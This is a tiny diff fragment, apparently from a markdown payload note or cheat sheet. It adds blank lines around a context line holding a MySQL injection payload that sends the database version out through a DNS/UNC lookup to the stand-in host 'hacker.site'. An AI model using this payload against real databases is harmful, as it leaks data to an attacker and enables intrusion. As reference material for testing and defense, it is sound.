@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:22:53.482257+00:00'
 ```bash
 select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
 ```
+
+
